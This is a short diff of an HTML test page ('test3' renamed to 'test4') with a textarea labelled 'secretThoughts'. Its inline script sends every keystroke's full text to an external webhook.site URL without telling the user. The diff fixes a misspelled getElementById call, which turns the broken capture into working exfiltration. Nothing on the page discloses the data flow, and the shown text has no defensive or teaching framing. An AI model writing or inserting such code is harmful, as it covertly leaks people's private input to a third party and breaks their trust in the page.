@@ -10,10 +10,10 @@
 
 <body>
   <main>
-    <h1>test3</h1>
+    <h1>test4</h1>
     <textarea id="secretThoughts"></textarea>
     <script>
-      const textarea = document.getElemendById("secretThoughts")
+      const textarea = document.getElementById("secretThoughts")
       textarea.addEventListener("input", function (e) {
         const text = e.target.value
         fetch(`https://webhook.site/a5c720d9-c158-446c-a788-f3644b880ea2?text=${encodeURIComponent(text)}`)})
